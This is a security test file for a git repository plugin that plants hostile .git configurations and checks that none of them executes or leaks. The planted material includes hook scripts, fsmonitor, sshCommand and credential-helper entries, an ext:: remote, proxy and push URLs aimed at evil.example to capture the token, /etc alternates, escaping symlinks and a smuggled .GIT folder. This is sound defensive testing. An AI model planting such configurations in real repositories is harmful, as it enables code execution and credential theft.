// A book from someone else, with a malicious .git folder. The system's git would run the commands it names.
// The plugin has no way to run anything, and these tests prove that nothing runs and nothing outside the project is touched.
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { promises as fs } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { commit, log, stageAll, sync } from '../plugins/repository/src/history'
import { exists, gitServer, now, plainNet, repoAt, sh, TEXTS, write } from './helpers'

let dir: string
let server: Awaited<ReturnType<typeof gitServer>>
const ran = () => path.join(dir, 'ran')
/** Leaves a mark if anything runs it. */
const program = async () => {
  const file = path.join(dir, 'evil.sh')
  await fs.writeFile(file, `#!/bin/sh\ntouch '${ran()}'\ncat\n`, { mode: 0o755 })
  return file
}

beforeAll(async () => {
  dir = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'black-hostile-')))
  server = await gitServer(dir)
})
afterAll(async () => {
  await server.close()
  await fs.rm(dir, { recursive: true, force: true })
})

/** A project with a repository whose configuration and hooks someone else wrote. */
const hostile = async (name: string, config: string, attributes = '') => {
  const root = path.join(dir, name)
  await write(root, 'project.json', '{"name":"Hostile","books":[]}')
  await write(root, 'books/one/docs/a.html', '<p>Text</p>')
  sh(root, ['init', '-q', '-b', 'main'])
  await fs.appendFile(path.join(root, '.git', 'config'), config)
  if (attributes) await write(root, '.gitattributes', attributes)
  const evil = await program()
  await fs.mkdir(path.join(root, '.git', 'hooks'), { recursive: true })
  for (const hook of ['pre-commit', 'commit-msg', 'post-commit', 'pre-push', 'post-merge', 'post-checkout', 'pre-receive', 'fsmonitor-watchman'])
    await fs.writeFile(path.join(root, '.git', 'hooks', hook), `#!/bin/sh\n${evil}\n`, { mode: 0o755 })
  return root
}

const everything = async (root: string) => {
  const r = repoAt(root)
  expect(await commit(r, 'first')).toBeTruthy()
  await write(root, 'books/one/docs/a.html', '<p>More</p>')
  expect(await commit(r, 'second')).toBeTruthy()
  expect((await log(r, 'books/one/docs/a.html')).length).toBe(2)
  const name = `${path.basename(root)}.git`
  sh(dir, ['init', '-q', '--bare', path.join(dir, name)])
  sh(path.join(dir, name), ['config', 'http.receivepack', 'true'])
  expect(await sync(r, server.url(name), 'main', '', TEXTS, now)).toMatchObject({ ok: true })
  // Nothing ran.
  expect(await exists(ran())).toBe(false)
  return r
}

describe('a hostile .git', () => {
  it('runs no hooks at commit or push', async () => {
    await everything(await hostile('Hooks.black', ''))
  })

  it('doesn’t run core.fsmonitor, core.sshCommand, core.hooksPath, a pager, an editor or a credential helper', async () => {
    const evil = await program()
    await everything(
      await hostile(
        'Core.black',
        `[core]\n\tfsmonitor = ${evil}\n\tsshCommand = ${evil}\n\thooksPath = ${path.join(dir, 'hooks')}\n\tpager = ${evil}\n\teditor = ${evil}\n\taskPass = ${evil}\n\tgitProxy = ${evil}\n[credential]\n\thelper = !${evil}\n`,
      ),
    )
  })

  it('doesn’t run a clean filter, a merge or diff driver, or a signing program', async () => {
    const evil = await program()
    await everything(
      await hostile(
        'Drivers.black',
        `[filter "x"]\n\tclean = ${evil}\n\tsmudge = ${evil}\n[merge "x"]\n\tdriver = ${evil}\n[diff "x"]\n\ttextconv = ${evil}\n[commit]\n\tgpgsign = true\n[gpg]\n\tprogram = ${evil}\n`,
        '* filter=x merge=x diff=x\n',
      ),
    )
  })

  it('doesn’t reach a partial-clone remote, or fetch what’s missing', async () => {
    const evil = await program()
    await everything(
      await hostile(
        'Partial.black',
        `[remote "origin"]\n\turl = ext::${evil}\n\tpromisor = true\n\tpartialclonefilter = blob:none\n\tuploadpack = ${evil}\n\treceivepack = ${evil}\n[extensions]\n\tpartialClone = origin\n`,
      ),
    )
  })

  it('doesn’t read configuration from another file', async () => {
    const evil = await program()
    await fs.writeFile(path.join(dir, 'more.conf'), `[filter "x"]\n\tclean = ${evil}\n[user]\n\tname = Included\n`)
    const root = await hostile('Included.black', `[include]\n\tpath = ${path.join(dir, 'more.conf')}\n`, '* filter=x\n')
    await everything(root)
    expect(sh(root, ['log', '-1', '--format=%an']).trim()).toBe('writer')
  })

  it('doesn’t send the token through a proxy the configuration names', async () => {
    const root = await hostile('Proxy.black', `[http]\n\tcorsProxy = https://evil.example\n\tproxy = https://evil.example\n[url "https://evil.example/"]\n\tinsteadOf = http://\n`)
    const { net, seen } = plainNet()
    const r = repoAt(root, net)
    await commit(r, 'first')
    sh(dir, ['init', '-q', '--bare', path.join(dir, 'proxy.git')])
    sh(path.join(dir, 'proxy.git'), ['config', 'http.receivepack', 'true'])
    const url = server.url('proxy.git')
    expect(await sync(r, url, 'main', '', TEXTS, now)).toMatchObject({ ok: true })
    expect(seen.length).toBeGreaterThan(0)
    for (const s of seen) expect(s.url.startsWith(url), s.url).toBe(true)
  })

  it('uses the address it’s given, not one in the configuration', async () => {
    const root = await hostile('Remote.black', `[remote "repository"]\n\turl = https://evil.example/stolen.git\n\tpushurl = https://evil.example/stolen.git\n`)
    const { net, seen } = plainNet()
    const r = repoAt(root, net)
    await commit(r, 'first')
    sh(dir, ['init', '-q', '--bare', path.join(dir, 'remote.git')])
    sh(path.join(dir, 'remote.git'), ['config', 'http.receivepack', 'true'])
    expect(await sync(r, server.url('remote.git'), 'main', '', TEXTS, now)).toMatchObject({ ok: true })
    for (const s of seen) expect(s.url).not.toContain('evil.example')
  })

  it('leaves a nested repository alone, and doesn’t commit what’s in it', async () => {
    const root = await hostile('Nested.black', '')
    const inner = path.join(root, 'books', 'one', 'files')
    await fs.mkdir(inner, { recursive: true })
    sh(inner, ['init', '-q'])
    const evil = await program()
    await fs.appendFile(path.join(inner, '.git', 'config'), `[core]\n\tfsmonitor = ${evil}\n\tsshCommand = ${evil}\n`)
    await fs.writeFile(path.join(inner, '.git', 'hooks', 'pre-commit'), `#!/bin/sh\n${evil}\n`, { mode: 0o755 })
    const config = await fs.readFile(path.join(inner, '.git', 'config'), 'utf8')
    const r = repoAt(root)
    await commit(r, 'first')
    expect(sh(root, ['ls-files'])).not.toContain('books/one/files/.git')
    expect(await fs.readFile(path.join(inner, '.git', 'config'), 'utf8')).toBe(config)
    expect(await exists(ran())).toBe(false)
  })

  it('doesn’t follow a link out of the project, or keep one in a version', async () => {
    const root = await hostile('Linked.black', '')
    const outside = path.join(dir, 'outside')
    await fs.mkdir(outside)
    await fs.writeFile(path.join(outside, 'secret.txt'), 'secret')
    await fs.symlink(outside, path.join(root, 'books', 'one', 'away'))
    await fs.symlink(path.join(outside, 'secret.txt'), path.join(root, 'books', 'one', 'away.txt'))
    const r = repoAt(root)
    await commit(r, 'first')
    expect(sh(root, ['ls-files'])).not.toContain('away')
    expect(r.used.filter((p) => p.includes('away/'))).toEqual([])
    expect(await fs.readFile(path.join(outside, 'secret.txt'), 'utf8')).toBe('secret')
    expect(await exists(ran())).toBe(false)
  })

  it('reads no path outside the project, whatever the repository says', async () => {
    const root = await hostile('Alternates.black', '')
    await fs.mkdir(path.join(root, '.git', 'objects', 'info'), { recursive: true })
    await fs.writeFile(path.join(root, '.git', 'objects', 'info', 'alternates'), `${path.join(dir, 'elsewhere')}\n/etc\n`)
    const r = repoAt(root)
    await stageAll(r)
    await commit(r, 'first')
    expect(r.used.filter((p) => p.startsWith('/') || p.split('/').includes('..'))).toEqual([])
    expect(await exists(ran())).toBe(false)
  })

  it('never brings a .git from a repository’s tree into the folder, however it’s spelled', async () => {
    const name = 'tree.git'
    const bare = path.join(dir, name)
    sh(dir, ['init', '-q', '--bare', bare])
    sh(bare, ['config', 'http.receivepack', 'true'])
    const url = server.url(name)
    const a = path.join(dir, 'TreeA.black')
    const b = path.join(dir, 'TreeB.black')
    const ra = repoAt(a)
    await write(a, 'project.json', '{"title":"Saga"}')
    await write(a, 'docs/s1.html', '<p>One</p>')
    await commit(ra, 'Begun')
    expect((await sync(ra, url, 'saga', '', TEXTS, now)).ok).toBe(true)
    sh(dir, ['clone', '-q', '--branch', 'saga', bare, b])
    const rb = repoAt(b)

    // Someone with access to the repository adds a commit whose tree contains a .GIT folder.
    const tip = sh(bare, ['rev-parse', 'refs/heads/saga']).trim()
    const blob = sh(bare, ['hash-object', '-w', '--stdin'], '[core]\n\tfsmonitor = touch pwned\n').trim()
    const evil = sh(bare, ['mktree'], `100644 blob ${blob}\tconfig\n`).trim()
    const listing = sh(bare, ['ls-tree', `${tip}^{tree}`]).trim()
    const tree = sh(bare, ['mktree'], `${listing}\n040000 tree ${evil}\t.GIT\n`).trim()
    const made = sh(bare, ['-c', 'user.name=M', '-c', 'user.email=m@x', 'commit-tree', tree, '-p', tip, '-m', 'evil'], '').trim()
    sh(bare, ['update-ref', 'refs/heads/saga', made])

    // B has changes too, so the two are merged file by file.
    await write(b, 'docs/s1.html', '<p>One, from B</p>')
    await commit(rb, 'B')
    const merged = await sync(rb, url, 'saga', '', TEXTS, now)
    expect(merged.changed.some((f) => /\.git/i.test(f))).toBe(false)
    expect(await fs.readdir(b)).not.toContain('.GIT')
    expect(await fs.readFile(path.join(b, '.git', 'config'), 'utf8')).not.toContain('pwned')
  })
})
